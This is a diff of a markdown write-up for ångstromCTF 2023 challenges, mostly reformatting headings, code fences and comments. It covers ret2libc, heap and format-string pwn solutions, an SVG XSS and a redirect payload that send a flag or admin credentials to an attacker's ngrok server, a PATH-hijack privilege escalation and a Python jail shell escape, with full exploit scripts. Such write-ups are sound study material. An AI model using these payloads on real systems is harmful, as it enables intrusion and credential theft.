@@ -2,11 +2,13 @@
 title: "ångstromCTF 2023"
 date: "2023-04-22"
 tags: ["CTF", "ångstrom", "jeopardy"]
+draft: false
+hideToc: false
 ---
 
-# Pwn
+## Pwn
 
-## Gaga
+### Gaga
 
 This was a simple ret2libc challenge. There were two baby steps, which I skipped as the full flag was on the last one actually.
 The main function is the following:
@@ -40,7 +42,7 @@ A thing that has to be noted is the following: some libcs require calls to be al
 
 The overall solve is the following:
 
-```py
+```p
 #!/usr/bin/env python3
 
 from pwn import *
@@ -70,22 +72,22 @@ def conn(*a, **kw):
 
 io = conn(level="debug")
 
-# Add functions below here, if needed
+## Add functions below here, if needed
 
 
 def main():
     global io
 
-    # good luck pwning :)
+    ## good luck pwning :)
     pop_rdi = 0x00000000004012B3
     ret = 0x000000000040101A
 
     rop = ROP(exe)
-    rop.raw(ret)  # ret (stack alignment)
-    rop.raw(pop_rdi)  # pop rdi
+    rop.raw(ret)  ## ret (stack alignment)
+    rop.raw(pop_rdi)  ## pop rdi
     rop.raw(exe.got.__libc_start_main)
     rop.raw(exe.symbols.printf)
-    rop.raw(ret)  # ret (stack alignment)
+    rop.raw(ret)  ## ret (stack alignment)
     rop.main()
 
     payload = b"A" * 64 + b"B" * 8 + rop.chain()
@@ -97,9 +99,9 @@ def main():
     log.success(f"libc @ {hex(libc.address)}")
 
     rop = ROP(exe)
-    rop.raw(ret)  # ret (stack alignment)
-    rop.raw(pop_rdi)  # pop rdi
-    rop.raw(next(libc.search(b"/bin/sh\x00")))  # /bin/sh\x00 pointer
+    rop.raw(ret)  ## ret (stack alignment)
+    rop.raw(pop_rdi)  ## pop rdi
+    rop.raw(next(libc.search(b"/bin/sh\x00")))  ## /bin/sh\x00 pointer
     rop.raw(libc.symbols.system)
     payload = b"A" * 64 + b"B" * 8 + rop.chain()
     io.sendlineafter(b"Your input: ", payload)
@@ -112,11 +114,11 @@ if __name__ == "__main__":
 
 ```
 
-## Leek
+### Leek
 
 This is a challenge that allows to learn a little bit about how GLIBC `malloc` is implemented and works.
 
-### Exploration
+#### Exploration
 
 The main of the challenge is roughly the following:
 
@@ -211,11 +213,11 @@ If we guess correctly, it calls `gets(first_chunk)`, allowing us to write as man
 
 New to heap? I recommend reading some online resources about how it works before continuing. There are good articles, such as the series from [azeria-labs](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/). Of course, also checking the [source code](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c) is a good option.
 
-### Exploitation
+#### Exploitation
 
 The first thing we need to do is overflowing the second chunk. Due to the calls to `setvbuf`, we don't have to worry about functions allocating stuff on the heap. Therefore, we can expect the two chunks to be adjacent. In particular, we will have the first chunk right above the second one. This is how the heap looks from GDB:
 
-```
+```text
 0x174f290:	0x0000000000000000	0x0000000000000021 <-- first chunk header
 0x174f2a0:	0x0000000000000000	0x0000000000000000 <-- first chunk data
 0x174f2b0:	0x0000000000000000	0x0000000000000031 <-- second chunk header
@@ -226,7 +228,7 @@ The first thing we need to do is overflowing the second chunk. Due to the calls 
 
 To pass the check on the second chunk content, we can simply overwrite the second chunk content to be all As. The heap will now look similar to this:
 
-```
+```text
 0x174f290:	0x0000000000000000	0x0000000000000021 <-- first chunk header
 0x174f2a0:	0x6161616261616161	0x6161616461616163 <-- first chunk data
 0x174f2b0:	0x6161616661616165	0x6161616861616167 <-- second chunk header
@@ -241,7 +243,7 @@ We now need to fix the metadata. What was there in the first place?
 The first chunk header is untouched, as we read starting from its data.
 What is completely changed is the second chunk header. Before the overwrite, it was:
 
-```
+```text
 0x174f2b0:	0x0000000000000000	0x0000000000000031
 ```
 
@@ -287,7 +289,7 @@ io = conn(level="debug")
 def main():
     global io
 
-    # good luck pwning :)
+    ## good luck pwning :)
     secret = b"A" * 0x20
     pwnit = flat({0x20: secret})
     fixup = flat({0x10: 0, 0x18: 0x31})
@@ -304,7 +306,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## Widget
+### Widget
 
 We are given an ELF binary. The main function looks like the following:
 
@@ -381,7 +383,7 @@ We can see that, if called with the correct parameters, this function will actua
 
 Well, only seemingly so. The problem here is that we are missing the usual gadgets from `__libc_csu_init`. A quick look with ropper reveals this:
 
-```
+```text
 (widget/ELF/x86_64)> search pop%
 [INFO] Searching for gadgets: pop%
 
@@ -433,7 +435,7 @@ io = conn(level="debug")
 def main():
     global io
 
-    # good luck pwning :)
+    ## good luck pwning :)
     if not args.LOCAL and not args.GDB:
         io.recvuntil(b"sh -s ")
         io.sendlineafter(
@@ -454,7 +456,7 @@ if __name__ == "__main__":
 
 ```
 
-## Slack
+### Slack
 
 Yet another format string vulnerability... but I swear this is kinda interesting to solve actually (and so will be the next one too)!
 
@@ -570,7 +572,7 @@ def pwn(level):
     ptr_offset = 0x4D - 0x6 - 16
     log.success(f"retaddr @ {hex(retaddr)}")
     log.success(f"ptr_ptr @ {hex(ptr_ptr)}")
-    pop_rcx = libc.address + 0x000000000008C6BB  # pop rcx; ret;
+    pop_rcx = libc.address + 0x000000000008C6BB  ## pop rcx; ret;
     one_gadget = libc.address + 0x50A37
 
     io.sendafter(
@@ -588,7 +590,7 @@ def pwn(level):
       rbp == NULL || (u16)[rbp] == NULL
     """
 
-    # pop rcx
+    ## pop rcx
     for i in range(6):
         io.sendafter(
             b"Professional):",
@@ -599,7 +601,7 @@ def pwn(level):
             f"%{(pop_rcx >> (8 * i)) & 0xff}c%{ptr_offset}$hhn".encode(),
         )
 
-    # one_gadget
+    ## one_gadget
     for i in range(6):
         io.sendafter(
             b"Professional):",
@@ -610,7 +612,7 @@ def pwn(level):
             f"%{(one_gadget >> (8 * i)) & 0xff}c%{ptr_offset}$hhn".encode(),
         )
 
-    # rbp to zero
+    ## rbp to zero
     io.sendafter(
         b"Professional):",
         f"%{(retaddr & 0xffff) - 8}c%{ptr_ptr_offset}$hn".encode(),
@@ -620,7 +622,7 @@ def pwn(level):
         f"%{ptr_offset}$hhn".encode(),
     )
 
-    # reset for index to trigger return
+    ## reset for index to trigger return
     io.sendafter(
         b"Professional):",
         f"%{(stack_leak & 0xffff) - 0x180 + 3}c%{ptr_ptr_offset}$hn".encode(),
@@ -634,7 +636,7 @@ def pwn(level):
 def main():
     global io
 
-    # good luck pwning :)
+    ## good luck pwning :)
     io = pwn("debug")
     io.interactive()
 
@@ -643,7 +645,7 @@ if __name__ == "__main__":
     main()
 ```
 
-## Noleek
+### Noleek
 
 The challenge provides us with the source code:
 
@@ -720,13 +722,13 @@ def conn(*a, **kw):
 
 io = conn(level="debug")
 
-# Add functions below here, if needed
+## Add functions below here, if needed
 
 
 def main():
     global io
 
-    # good luck pwning :)
+    ## good luck pwning :)
 
     """
     0xc9620 execve("/bin/sh", rsi, rdx)
@@ -734,14 +736,14 @@ def main():
       [rsi] == NULL || rsi == NULL
       [rdx] == NULL || rdx == NULL
     """
-    payload = "%*1$.d"  # read a stack address as padding
-    payload += "%56c"  # offset from the stack address to the return address stack address
-    payload += "%13$n"  # offset for the pointer to a stack pointer
+    payload = "%*1$.d"  ## read a stack address as padding
+    payload += "%56c"  ## offset from the stack address to the return address stack address
+    payload += "%13$n"  ## offset for the pointer to a stack pointer
     io.sendlineafter(b"leek? ", payload.encode())
 
-    payload = "%*12$.d"  # read a libc address as padding
-    payload += "%678166c"  # offset from that libc address to the onegadget
-    payload += "%42$n"  # offset of the pointer to return address
+    payload = "%*12$.d"  ## read a libc address as padding
+    payload += "%678166c"  ## offset from that libc address to the onegadget
+    payload += "%42$n"  ## offset of the pointer to return address
     io.sendlineafter(b"leek? ", payload.encode())
 
     io.interactive()
@@ -751,32 +753,35 @@ if __name__ == "__main__":
     main()
 ```
 
-# Web
+## Web
 
-## Hallmark
+### Hallmark
 
 The challenge consists on two websites: one contains the application, for which the source code is provided, and the other allows us to submit a link to the admin bot.
 
 The main application contains a form from which we can create greeting cards, either by inserting text or selecting one of the proposed images. The card is created via a `POST` request, and it can be recovered from the `/card` endpoint, specifying its id.
 
 From the source code we can see two more interesting endpoints:
- - `/flag` retrieves the flag for the admin;
- - the `PUT` method for `/card/` allow us to edit a card.
+
+- `/flag` retrieves the flag for the admin;
+- the `PUT` method for `/card/` allow us to edit a card.
 
 The interesting part of the source code is the following:
 
- - Retrieving the flag:
+- Retrieving the flag:
+
 ```javascript
 app.get("/flag", (req, res) => {
-    if (req.cookies && req.cookies.secret === secret) {
-        res.send(flag);
-    } else {
-        res.send("you can't view this >:(");
-    }
+  if (req.cookies && req.cookies.secret === secret) {
+    res.send(flag);
+  } else {
+    res.send("you can't view this >:(");
+  }
 });
 ```
 
- - Retrieving a card
+- Retrieving a card
+
 ```javascript
 app.get("/card", (req, res) => {
     if (req.query.id && cards[req.query.id]) {
@@ -787,42 +792,43 @@ app.get("/card", (req, res) => {
     }
 ```
 
- - Creating a card
+- Creating a card
 
 ```javascript
 app.post("/card", (req, res) => {
-    let { svg, content } = req.body;
+  let { svg, content } = req.body;
 
-    let type = "text/plain";
-    let id = v4();
+  let type = "text/plain";
+  let id = v4();
 
-    if (svg === "text") {
-        type = "text/plain";
-        cards[id] = { type, content }
-    } else {
-        type = "image/svg+xml";
-        cards[id] = { type, content: IMAGES[svg] }
-    }
+  if (svg === "text") {
+    type = "text/plain";
+    cards[id] = { type, content };
+  } else {
+    type = "image/svg+xml";
+    cards[id] = { type, content: IMAGES[svg] };
+  }
 
-    res.redirect("/card?id=" + id);
+  res.redirect("/card?id=" + id);
 });
 ```
 
- - Updating a card
+- Updating a card
 
 ```javascript
 app.put("/card", (req, res) => {
-    let { id, type, svg, content } = req.body;
+  let { id, type, svg, content } = req.body;
 
-    if (!id || !cards[id]){
-        res.send("bad id");
-        return;
-    }
+  if (!id || !cards[id]) {
+    res.send("bad id");
+    return;
+  }
 
-    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
-    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
+  cards[id].type = type == "image/svg+xml" ? type : "text/plain";
+  cards[id].content =
+    type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
 
-    res.send("ok");
+  res.send("ok");
 });
 ```
 
@@ -843,8 +849,10 @@ id=<card_id>&type[0]=image%2fsvg%2bxml&svg=&content=%3c%3fxml%20version%3d%221.0
 ```
 
 where:
- - the type parameter is the vector `[ "image/svg+xml" ]`, which will be interpreted as a string on the first comparison, leading to the content type `image/svg+xml`, and will fail the second comparison, leading to the content being set to our content;
- - The content is the following XML, which causes the flag to be sent to our ngrok server:
+
+- the type parameter is the vector `[ "image/svg+xml" ]`, which will be interpreted as a string on the first comparison, leading to the content type `image/svg+xml`, and will fail the second comparison, leading to the content being set to our content;
+- The content is the following XML, which causes the flag to be sent to our ngrok server:
+
 ```xml
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -858,8 +866,7 @@ where:
 </svg>
 ```
 
-
-## Broken Login
+### Broken Login
 
 The application consists on two pages: one contains the main application, and the other allows us to send a link to the admin bot. The source code for both pages is provided.
 
@@ -875,9 +882,9 @@ def index():
     if "message" in request.args:
         if len(request.args["message"]) >= 25:
             return render_template_string(indexPage, fails=fails)
-        
+
         custom_message = escape(request.args["message"])
-    
+
     return render_template_string(indexPage % custom_message, fails=fails)
 ```
 
@@ -890,8 +897,7 @@ The payload which we insert is the following: `<script>document.location="<ngrok
 
 By sending the admin this malicious link, he will first be redirected to our page, on which he will insert its credentials and submit the form to our same server.
 
-
-## Filestore
+### Filestore
 
 We are given the source code for a simple PHP application, as well as a Dockerfile and a couple of ELFs.
 
@@ -943,7 +949,7 @@ Before this, however, we need to find a way to get the flag. From the Dockerfile
 Remember that there are two binaries in the filesystem of the challenge?
 Well, from the Dockerfile we can see that they have the SETUID bit set, and they are owned by `admin`, meaning that we may be able to use them to escalate our privileges.
 
-### Finding a privilege escalation...
+#### Finding a privilege escalation...
 
 We proceeded by opening these two ELFs in Ghidra. They are both pretty simple. The `make_abyss_entry` binary is just used to create a temporary directory in the `/abyss` directory, which we cannot list. This is probably here to allow us to create files on the filesystem without leaking them to other CTF players.
 Then, we analyzed the `list_uploads` binary too. The decompiled main looks like the following:
@@ -963,7 +969,7 @@ void main(void) {
 
 Do you see the vulnerability in here? The issue is not that it is using `system` (well, that's part of it actually...). The problem here arises from the fact that it is using `system` and calling `ls` without specifying the full path or clearing the `PATH` env variable. Therefore, we can hijack its call to `ls` by defining a script named `ls` and setting `PATH=/dir/of/our/ls:$PATH`, leading to our `ls` script being executed with `admin` privileges.
 
-### ... and exploiting it!
+#### ... and exploiting it!
 
 We know have all the pieces to exploit the vulnerability, right? Right?
 Almost: notice line 39 on the Dockerfile:
@@ -987,7 +993,7 @@ system("export PATH=/abyss/$abyss:\\$PATH && /list_uploads");
 
 The first line creates a directory in `/abyss` to put our `ls` in. Then, we first create the `ls` file with a simple `cat /flag.txt` command in it, we `chmod` it using PERL, and finally we run the `/list_uploads` ELF with the PATH set to use our `ls`.
 
-### Sending the exploit
+#### Sending the exploit
 
 Last issue: we have to send our exploit and have it executed. To do this, we need to somehow guess the `uniqid()` output. The first thing that we can notice is that the server includes the `Date` header. From MSN documentation: "The Date general HTTP header contains the date and time at which the message originated. "
 From this, we get to know the second in which the `uniqid()` was (likely) called. This de-randomizes the first 8 nibbles of `uniqid()`. The last 5 nibbles are still random, but we can try to brute force them. They are quite a bit, but with a bit (double pun intended) of luck we manage to succeed.
@@ -1041,13 +1047,14 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
 
 P.S. when solving the challenge, this script worked at the first execution. Now it doesn't seem to find the flag. We may have got lucky with a very low `uniqid()` value for the microseconds. There may also be a smarter solution as well, but an online bruteforce of $~10^6$ looks feasible enough to me 🙃.
 
-# Misc
+## Misc
 
-## Obligatory
+### Obligatory
 
 The challenge consists on a python jail.
 The code is given:
-```Python
+
+```py
 #!/usr/local/bin/python
 cod = input("sned cod: ")
 
@@ -1061,36 +1068,43 @@ else:
 ```
 
 To exploit this jail we will use the following:
- - The [walrus operator](https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions), `:=`, which allows assignments inside expressions;
- - The [`__builtins__` variable](https://docs.python.org/3/library/builtins.html), which contains the module with all built-in identifiers;
- - [Lambda expressions](https://docs.python.org/3/tutorial/controlflow.html?highlight=lambda#lambda-expressions);
- - `and` operator, to execute multiple things.
+
+- The [walrus operator](https://docs.python.org/3/whatsnew/3.8.html#assignment-expressions), `:=`, which allows assignments inside expressions;
+- The [`__builtins__` variable](https://docs.python.org/3/library/builtins.html), which contains the module with all built-in identifiers;
+- [Lambda expressions](https://docs.python.org/3/tutorial/controlflow.html?highlight=lambda#lambda-expressions);
+- `and` operator, to execute multiple things.
 
 The payload to exploit this challenge is `(__builtins__:=__import__('os'))and((lambda:system('sh'))())`, which works as follows:
- 1. First it overrides `__builtins__` to make all `os` symbols available;
- 2. Then something else is executed by using `and`;
- 3. A lambda function is created, and it will call `system('os')`;
- 4. The lambda function is executed via `()`, and spawn a shell for us.
+
+1.  First it overrides `__builtins__` to make all `os` symbols available;
+2.  Then something else is executed by using `and`;
+3.  A lambda function is created, and it will call `system('os')`;
+4.  The lambda function is executed via `()`, and spawn a shell for us.
 
 Once we have the shell, we can list and cat the flag:
 ![Exploit execution](/images/angstrom2023_obligatory_execution.jpg)
 
-# Network
+## Network
 
-## Admiral shark
+### Admiral shark
 
 The challenge consists on a network capture of a conversation, in which we have to find the flag.
 
 At some point, in frame 91, we can clearly see some XMLs sent from `10.0.2.4` to `10.0.2.15`:
 
-```
+```text
 140008080800177a905600000000000000000000000018000000786c2f64726177696e67732f64726177696e67312e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145ed04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3ff9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6fb395283882d76083c7465c90c56efbb41935adcfbca722ed7b5ea7b2117d8cc35a4a563d3ae0320ce8d3b40de420a6923aa909ce497656ceabea45f240089a7bc4b89f26e2eac1039a03e3f3fe4dd784b6350af7419d1cfa3821841662fa05f766e0aca907ae513d50fc01c67f82338a028736962ab8eb29d94842fd3c0938fe1af5ddc852becad55fc8dd14c7011d4fc32cb9437ac887b1265ebe93654677ee81b768031d81cbc8b838f8e3ddb12ac936b5282b6cb15edeadccb322b75f504b0708076269830501000007030000504b0304140008080800177a905600000000000000000000000018000000.....
 ```
 
 This pattern repeats on the data and can be read as follows:
- - the part right after `00018000000` contains the filename, in the provided example is `xl/drawings/drawing1.xml`;
- - the remaining part before the next filename is the content of the file, compressed using the deflate algorithm.
 
-We're able to extract the flag from the data with the following CyberChef filter: `Split('00786c','0d0a00786c')Split('786d6c','786d6c0d0a')From_Hex('None')Fork('\\r\\n','\\n',true)Raw_Inflate(0,0,'Adaptive',false,false)Merge(true)Regular_expression('User defined','ctf{[a-zA-Z0-9_]*}',true,true,false,false,false,false,'List matches')`.
+- the part right after `00018000000` contains the filename, in the provided example is `xl/drawings/drawing1.xml`;
+- the remaining part before the next filename is the content of the file, compressed using the deflate algorithm.
+
+We're able to extract the flag from the data with the following CyberChef filter:
+
+```text
+Split('00786c','0d0a00786c')Split('786d6c','786d6c0d0a')From_Hex('None')Fork('\\r\\n','\\n',true)Raw_Inflate(0,0,'Adaptive',false,false)Merge(true)Regular_expression('User defined','ctf{[a-zA-Z0-9_]*}',true,true,false,false,false,false,'List matches')
+```
+
 ![CyberChef screenshot of the applied filters](/images/angstrom2023_cyberchef.jpg "CyberChef filters to extract the flag")
-
